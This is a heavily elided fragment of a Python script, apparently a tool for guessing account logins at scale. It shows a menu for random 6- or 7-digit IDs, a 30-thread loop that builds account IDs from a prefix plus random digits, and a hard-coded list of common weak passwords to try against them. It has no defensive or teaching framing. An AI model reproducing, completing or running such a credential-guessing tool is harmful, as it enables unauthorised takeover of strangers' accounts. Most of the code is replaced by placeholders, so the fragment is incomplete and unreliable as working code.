...
def SETINGX():
    ...
    print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH 6 DIGIT")
    print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH 7 DIGIT");linex()
...
def RANDOM():
 ...
 # print(led)
  ...
  with tred(max_workers=30) as king_xd:
    ...
    for guru in user:
      ids = kode+guru
      pwv = ['57273200','57575751','59039200','57575752','123456','12345678','123456789','786786']
